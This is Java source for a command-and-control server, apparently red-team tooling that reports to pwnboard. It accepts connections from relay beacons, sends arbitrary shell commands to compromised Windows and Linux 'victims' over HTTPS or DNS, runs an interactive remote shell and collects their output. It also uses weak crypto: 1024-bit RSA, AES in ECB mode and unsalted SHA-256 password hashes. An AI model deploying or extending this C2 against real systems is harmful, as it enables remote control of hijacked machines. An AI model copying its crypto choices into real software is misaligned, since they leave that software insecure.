package Servers.C2;

import java.io.IOException;
import java.io.File;
import java.io.FileNotFoundException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.sql.Time;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import org.json.JSONObject;

import Servers.Duplexer;
import Servers.notifyLock;
import Servers.encryption.aes.*;
import Servers.encryption.rsa.*;

public class C2Server implements Runnable{
    private ConcurrentHashMap<String, String> usernamesPasswords;

    // Dictionary of all of the longRangeBeacons currently reporting back to the C2
    // Formatted IP Address, Duplexer Pointer
    private ConcurrentHashMap<String, C2ServerBeaconHandler> longRangeBeacons;
    private ConcurrentHashMap<String, String> beaconClientDnsMap;
    private ConcurrentHashMap<String, String> beaconClientHttpsMap;
    private ConcurrentHashMap<String, Boolean> isBeaconHTTP;

    // Dictionaries to Map IP's to Client responses
    private HashMap<String,ArrayList<String>> windowsClientResponses;
    private HashMap<String,ArrayList<String>> linuxClientResponses;

    // Dictionary to map IP Addresses to time last seen
    private ConcurrentHashMap<String, Time> clientLastSeen;
    private ConcurrentHashMap<String, Time> dnsClientLastSeen;

    // Bionded Server Socket
    private ServerSocket serverSocket;

    // Pointer to the API Handler
    private C2ServerAPI apiHandler;

    // Boolean to determine if server should remain running
    private boolean sentinel = true;

    // String for an IP address of a beacaon attempting to authenticate
    private String attemptedAuthIP;

    // Object used as lock for wait()/notify() to get responses instantly when in a shell
    private Object shellLock;

    // ID used by threads to make sure that .notify() is not called extra times multiple times
    private int shellID;

    // Object used to do RSA encryption and Decryption
    private rsa rsa;

    // Scanner for the user to enter input
    private Scanner userInputScanner;

    private HashMap<Integer, String> userMessageList;

    private String root_password;
    private String pwnboard_api_key;

    // Shared, bounded pool for pwnboard notifications so we don't spawn a new
    // Thread on every beacon heartbeat
    private final ExecutorService pwnBoardPool;

    // Cache of client IP string -> its split octets, so getIPMatches doesn't
    // re-split every connected client on every command/response lookup. An IP
    // string always splits to the same octets, so entries never need invalidating.
    private final Map<String, String[]> ipOctetsCache = new ConcurrentHashMap<>();

    /**
     * Initializes a Command and Control Server to handle connections from Long Range Beacons
     * Long Range Beacons handle all of the clients (victims)
     * @throws IOException
     */
    public C2Server() throws IOException{
        this.shellLock = new Object();
        this.shellID = 0;
        this.longRangeBeacons = new ConcurrentHashMap<>();
        this.serverSocket = new ServerSocket(1234);
        this.apiHandler = new C2ServerAPI(this);
        this.rsa = new rsa(1024);
        this.windowsClientResponses = new HashMap<>();
        this.linuxClientResponses = new HashMap<>();
        this.usernamesPasswords = new ConcurrentHashMap<>();
        this.userInputScanner = new Scanner(System.in);
        this.userMessageList = new HashMap<>();
        this.clientLastSeen = new ConcurrentHashMap<>();
        this.dnsClientLastSeen = new ConcurrentHashMap<>();
        this.beaconClientHttpsMap = new ConcurrentHashMap<>();
        this.beaconClientDnsMap = new ConcurrentHashMap<>();
        this.isBeaconHTTP = new ConcurrentHashMap<>();
        // core=2, max=8, 60s keep-alive, bounded queue of 500.
        // CallerRunsPolicy applies backpressure instead of spawning unbounded
        // threads or silently dropping updates when the queue fills.
        this.pwnBoardPool = new ThreadPoolExecutor(
                2, 8, 60, TimeUnit.SECONDS,
                new ArrayBlockingQueue<>(500),
                new ThreadPoolExecutor.CallerRunsPolicy());
    }

    

    /**
     * Adds/Changes a username and hashed password in the password hashmap
     * 
     * @param username - Username to be updated
     * @param hashedPassword - Hashed Password to be updated
     */
    protected void updateUsernamePassword(String username, String hashedPassword){
        usernamesPasswords.put(username, hashedPassword);
    }

    /**
     * Evaluates if a username and hashed password are valid credentials
     * 
     * @param username - username to be authenticated
     * @param hashedPassword - password to be authenticated
     * @return true or false, based on if authentication was successful or not
     */
    protected boolean authenticate(String username, String hashedPassword){
        try{
            if(usernamesPasswords.get(username).equals(hashedPassword)){
                return true;
            }
        } catch (Exception e){}        
        return false;
    }

    /**
     * Hashes a password with SHA-256
     * 
     * @param plaintext plaintext to be hashed
     * @return SHA-256 digest of the plaintext
     */
    protected static String hashPassword(String plaintext){
        String hashedPassword = "";
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(plaintext.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            hashedPassword = hexString.toString();
        } catch(Exception e){}
        return hashedPassword;
    }

    /**
     * Used by the Beacon Handler to send a message to the User Handler
     * 
     * @param message Message to be displayed in the User CLI
     */
    protected void outputToUser(String message){
        synchronized(userMessageList){
            userMessageList.put(userMessageList.size(), message);
        }
    }

    /**
     * Stops the server
     */
    protected void stopServer(){
        sentinel = false;
        pwnBoardPool.shutdown();
        try{
            serverSocket.close();
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    

    /**
     * Takes in the necessary parameters to run a command on all clients, formats it into a JSON object, and sends it to all of the beacons
     * 
     * @param scope - scope of the command
     * @param command - command
     */
    protected void distributeCommandToBeacons(String scope, String command){
        for (String clientIP : getIPMatches(scope)){
            JSONObject commandJSON = new JSONObject();
            commandJSON.put("verb", "command");
            commandJSON.put("scope", clientIP);
            commandJSON.put("command", command);

            // Try HTTPS first. Read each map once and null-check: the client may be
            // absent from a map, or its beacon may have disconnected, since these maps
            // are updated concurrently by the beacon threads.
            String httpsBeaconIP = beaconClientHttpsMap.get(clientIP);
            if (httpsBeaconIP != null){
                Time lastSeen = clientLastSeen.get(clientIP);
                C2ServerBeaconHandler beacon = longRangeBeacons.get(httpsBeaconIP);
                if (lastSeen != null && beacon != null &&
                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
                    beacon.sendToBeacon(commandJSON.toString());
                    // Reached this client over HTTPS; skip the DNS fallback and move to the next match
                    continue;
                }
            }
            // Fall back to DNS
            String dnsBeaconIP = beaconClientDnsMap.get(clientIP);
            if (dnsBeaconIP != null){
                Time lastSeen = dnsClientLastSeen.get(clientIP);
                C2ServerBeaconHandler beacon = longRangeBeacons.get(dnsBeaconIP);
                if (lastSeen != null && beacon != null &&
                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
                    beacon.sendToBeacon(commandJSON.toString());
                }
            }
        }
    }

    /**
     * Takes a client's IP Address, and returns the Operating System of the client
     * @param IPAddress - Client IP Address
     * @return Operating System of Client
     */
    protected String getClientOS(String IPAddress){
        synchronized(windowsClientResponses){
            if(windowsClientResponses.containsKey(IPAddress)){
                return "Windows";
            }
        }
        synchronized(linuxClientResponses){
            if(linuxClientResponses.containsKey(IPAddress)){
                return "Linux";
            }
        }
        return "none";
    }

    /**
     * Creates HashMaps to store responses for a new client
     * @param IPAddress - IP Address of new client
     * @param OS - Operating System of new client
     */
    protected void intializeVars(String IPAddress, String OS){
        if(OS.contains("Windows")){
            synchronized(windowsClientResponses){
                windowsClientResponses.put(IPAddress, new ArrayList<>());
            }
        } else if(OS.contains("Linux")){
            synchronized(linuxClientResponses){
                linuxClientResponses.put(IPAddress, new ArrayList<>());
            }
        }
        clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
    }

    public int getShellID(){
        return shellID;
    }

    /**
     * Takes in the scope and command, executes the command on the system. Then, waits for the response to the command to be returned, and outputs the resopnse immeditely
     * 
     * @param scope - scope of the command
     * @param command - command 
     */
    protected void getShellResponse(String scope, String command){
        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
        shellID++;
        notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
        backupNotifyLockThread.start();

        // Distribute the commands
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.setIsShell(true);
        }
        distributeCommandToBeacons(scope, command);

        // Wait for a response, once notified, notify the user handler that it can now continue
        try{
            synchronized(shellLock){
                shellLock.wait();
            }
        } catch (InterruptedException e){
            e.printStackTrace();
        }
        
        // Set each beaconHandler to not notify when it receives a response now
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.setIsShell(false);
        }
    }

     /**
     * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
     * 
     * @param IPAddress the IP Address of the Client that the response came from
     * @param Response The Response sent from the client
     */
    protected void addDataToResponsesDictionaries(String IPAddress, String Response){
        String os = getClientOS(IPAddress);
        if(os.equals("Windows")){
            synchronized(windowsClientResponses){
                ArrayList<String> responses = windowsClientResponses.get(IPAddress);
                if(responses != null){
                    responses.add(Response);
                }
            }
        } else if(os.equals("Linux")){
            synchronized(linuxClientResponses){
                ArrayList<String> responses = linuxClientResponses.get(IPAddress);
                if(responses != null){
                    responses.add(Response);
                }
            }
        }
    }

    /**
     * Get Responses from cleints to Commands issued by the C2 Server
     * 
     * @param scope Either Windows, Linux, or an IP Address. The IP address may contains Wildcards, such as 192.168.1.x
     * @return A Hash map with the client's ip address as the key, and an ArrayList containing all of it's resonses as the value
     */
    protected HashMap<String, ArrayList<String>> getClientResponses(String scope){
        HashMap<String, ArrayList<String>> responses = new HashMap<>();
        if(scope.equals("Windows")){
            synchronized(windowsClientResponses){
                for(String ip : windowsClientResponses.keySet()) {
                    responses.put(ip, windowsClientResponses.get(ip));
                }
            }
        } else if(scope.equals("Linux")){
            synchronized(linuxClientResponses){
                for(String ip : linuxClientResponses.keySet()) {
                    responses.put(ip, linuxClientResponses.get(ip));
                }
            }
        // Range of IPs 
        } else {
            ArrayList<String> ips = getIPMatches(scope);
            for (String ip : ips){
                synchronized(windowsClientResponses){
                    synchronized(linuxClientResponses){
                        if(windowsClientResponses.keySet().contains(ip)){
                            responses.put(ip, windowsClientResponses.get(ip));
                        } else if(linuxClientResponses.keySet().contains(ip)){
                            responses.put(ip, linuxClientResponses.get(ip));
                        }
                    }
                }
            }
        }
        return responses;
    }

    /**
     * Returns a point-in-time copy of a single client's responses, taken under the
     * appropriate lock. Used by /shell to diff responses before and after a command
     * without racing the beacon thread that appends to the live list.
     *
     * @param ip - IP Address of the client
     * @return a copy of the client's responses, or an empty list if the client is unknown
     */
    protected ArrayList<String> snapshotResponsesForIP(String ip){
        synchronized(windowsClientResponses){
            if(windowsClientResponses.containsKey(ip)){
                return new ArrayList<>(windowsClientResponses.get(ip));
            }
        }
        synchronized(linuxClientResponses){
            if(linuxClientResponses.containsKey(ip)){
                return new ArrayList<>(linuxClientResponses.get(ip));
            }
        }
        return new ArrayList<>();
    }

    protected void disableUser(String username){
        usernamesPasswords.remove(username);
    }

    protected ArrayList<String> getUserMessages(int messagesRead){
        ArrayList<String> newMessages = new ArrayList<>();
        synchronized(userMessageList){
            for(int i = messagesRead; i < userMessageList.size(); i++){
                newMessages.add(userMessageList.get(i));
            }
        }
        return newMessages;
    }

    /**
     * This Function takes an IP address, with a wildcard character, and returns all
     * Matches for that IP Address. 
     * 
     * Example
     * Client IP Address = {192.168.1.1, 192.168.4.5, 10.1.10.1, 10.2.10.1}
     * 
     * Parameter 10.x.10.1
     * Return Value {10.1.10.1, 10.2.10.1}
     * 
     * Parameter 192.168.1.x
     * Return Value {192.168.1.1}
     * 
     * Parameter 192.168.x.x
     * Return Value {192.168.1.1, 192.168.4.5}
     * 
     * Parameter 172.16.x.15
     * Return Value {}
     * 
     * @param IPAddress IP Address to Match
     * @return All Clients with a matching IP Address
     */
    private ArrayList<String> getIPMatches(String IPAddress){
        HashSet<String> matches = new HashSet<>();
        String octets[] = IPAddress.split("\\.");
        for(String ip : beaconClientHttpsMap.keySet()){
            if (ipMatches(octets, ip)) {
                matches.add(ip);
            }
        }
        for(String ip : beaconClientDnsMap.keySet()){
            if (ipMatches(octets, ip)) {
                matches.add(ip);
            }
        }
        return new ArrayList<>(matches);
    }

    /**
     * Compares a wildcard-aware query (already split into octets) against a client IP,
     * using the cached split of the client IP to avoid re-splitting on every call.
     *
     * @param queryOctets the query IP split into 4 octets, where "x" matches any value
     * @param clientIP the client IP address to test
     * @return true if the client IP matches the query
     */
    private boolean ipMatches(String[] queryOctets, String clientIP){
        String[] clientOctets = ipOctetsCache.computeIfAbsent(clientIP, k -> k.split("\\."));
        return (queryOctets[0].equals(clientOctets[0]) || queryOctets[0].equals("x")) &&
               (queryOctets[1].equals(clientOctets[1]) || queryOctets[1].equals("x")) &&
               (queryOctets[2].equals(clientOctets[2]) || queryOctets[2].equals("x")) &&
               (queryOctets[3].equals(clientOctets[3]) || queryOctets[3].equals("x"));
    }

    /**
     * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
     * 
     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
     * communicate with the Beacon, False if the client cannot communicate with the Beacon
     */
    protected HashMap<String, Boolean> getClientStatus(){
        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
        // True if the client is still active, false if the client is no longer active.
        HashMap<String, Boolean> clientStatus = new HashMap<>();

        for (String ip : clientLastSeen.keySet()){
            long currentTime = System.currentTimeMillis();
            long lastSeenTime = clientLastSeen.get(ip).getTime();
            if((currentTime - lastSeenTime) < 300000){
                clientStatus.put(ip, true);
            } else {
                clientStatus.put(ip, false);
            }
        }
        
        return clientStatus;
    }

    /**
     * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
     * 
     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
     * communicate with the Beacon, False if the client cannot communicate with the Beacon
     */
    protected HashMap<String, Boolean> getDnsClientStatus(){
        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
        // True if the client is still active, false if the client is no longer active.
        HashMap<String, Boolean> clientStatus = new HashMap<>();

        for (String ip : dnsClientLastSeen.keySet()){
            long currentTime = System.currentTimeMillis();
            long lastSeenTime = dnsClientLastSeen.get(ip).getTime();
            if((currentTime - lastSeenTime) < 300000){
                clientStatus.put(ip, true);
            } else {
                clientStatus.put(ip, false);
            }
        }
        
        return clientStatus;
    }

    protected void updateClientLastSeen(String IPAddress){
        clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
        
    }

    protected void updateDnsClientLastSeen(String IPAddress){
        dnsClientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
        pwnBoardPool.submit(new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key));
    }

    protected void updateBeaconClientHttpsMap(String clientIP, String beaconIP){
        beaconClientHttpsMap.put(clientIP, beaconIP);
        pwnBoardPool.submit(new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key));
    }

    protected void updateBeaconClientDnsMap(String clientIP, String beaconIP){
        beaconClientDnsMap.put(clientIP, beaconIP);
    }

    protected void setBeaconHTTP(String IPAddress){
        isBeaconHTTP.put(IPAddress, true);
    }

    /**
     * Removes a disconnected beacon and every client it was routing for from the
     * tracking maps, so dead beacons/clients no longer linger or get treated as live.
     * Collected client responses are intentionally preserved so the operator can still
     * read a client's final output after its beacon drops.
     *
     * @param beaconIP - IP Address of the beacon that disconnected
     */
    protected void removeBeacon(String beaconIP){
        longRangeBeacons.remove(beaconIP);
        isBeaconHTTP.remove(beaconIP);

        // Drop the HTTPS clients this beacon was routing for
        for(String clientIP : beaconClientHttpsMap.keySet()){
            if(beaconIP.equals(beaconClientHttpsMap.get(clientIP))){
                beaconClientHttpsMap.remove(clientIP);
                clientLastSeen.remove(clientIP);
            }
        }
        // Drop the DNS clients this beacon was routing for
        for(String clientIP : beaconClientDnsMap.keySet()){
            if(beaconIP.equals(beaconClientDnsMap.get(clientIP))){
                beaconClientDnsMap.remove(clientIP);
                dnsClientLastSeen.remove(clientIP);
            }
        }
    }

    @Override
    public void run(){
        File configFile = new File("/etc/javalanche/config.txt");
        try (Scanner fileReader = new Scanner(configFile)){
            while (fileReader.hasNextLine()){
                String data = fileReader.nextLine();
                // Split on the first colon only, so a value containing ':' is kept intact;
                // skip lines without a key:value separator
                String[] dataSplit = data.split(":", 2);
                if (dataSplit.length < 2){
                    continue;
                }
                if (dataSplit[0].equals("password")){
                    this.root_password = dataSplit[1];
                } else if (dataSplit[0].equals("pwnboard_api_key")){
                    this.pwnboard_api_key = dataSplit[1];
                }
            }
        } catch (FileNotFoundException e){
            e.printStackTrace();
            return;
        }

        // This password is stored as the root password in the Password database
        updateUsernamePassword("root", C2Server.hashPassword(root_password));
        
        
        // Start API
        Thread apiHandlerThread = new Thread(apiHandler);
        apiHandlerThread.start();

        // Always listen for new long range beacons
        while(sentinel){
            try{
                // Accept a new connection
                Socket socket = serverSocket.accept();

                // Create a new Duplexer
                Duplexer duplexer = new Duplexer(socket);

                // Get the IP address of the Duplexer
                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
                // We just care about the IP Address though
                String unformattedIPAddress = socket.getRemoteSocketAddress().toString();
                String IPAddress = unformattedIPAddress.split(":")[0].substring(1);
                attemptedAuthIP = IPAddress;

                // Send public key to beacon
                duplexer.send(rsa.getN(), true);
                duplexer.send(rsa.getE(), true);
                
                // Beacon key will encrypt the AES session key with the RSA public key
                String x = duplexer.receive(true);
                x = x.substring(0, x.length() - 1);
                String aesKey = rsa.decrypt(x);
                if(aesKey.length() % 8 != 0){
                    aesKey = "0" + aesKey;
                }
                aes aes = new aes(aesKey, modes.ECB);
                
                // Receive initial message for authentication from the new Beacon
                String hashedPassForAuth = aes.decrypt(duplexer.receive(true));
                String authResponse;
                // Pass this hash to the User Handler thread for MFA
                if(authenticate("root", hashedPassForAuth)){
                    System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
                    if(userInputScanner.nextLine().toLowerCase().equals("y")){
                        authResponse = "Authentication Successful";
                    }else{
                        authResponse = "Authentication Failed: C2 Server Denied MFA Prompt";
                    }
                } else {
                    authResponse = "Authentication Failed: Incorrect Password";
                }
                

                duplexer.send(aes.encrypt(authResponse), true);
                if(!(authResponse.equals("Authentication Successful"))){
                    duplexer.close();
                }else{
                    // Create a new thread to handle each Long Range Beacon
                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock, aes);
                    Thread beaconHandlerThread = new Thread(beaconHandler);

                    // Store IP and Duplexer pointer in the dicitonary
                    longRangeBeacons.put(IPAddress, beaconHandler);
                    isBeaconHTTP.put(IPAddress, false);

                    // Start the thread
                    beaconHandlerThread.start();
                }
                
            } catch(SocketException e){
                outputToUser("Attempted Beacon Authentication failed from " + attemptedAuthIP);
            } catch(IOException e){
                // Only print out when sentinel is true, if sentinel is false, then the C2 Server is shutting down
                if(sentinel){
                    e.printStackTrace();
                }
            } catch(Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws IOException{
        C2Server server = new C2Server();
        Thread serverThread = new Thread(server);
        serverThread.start();
    }
}

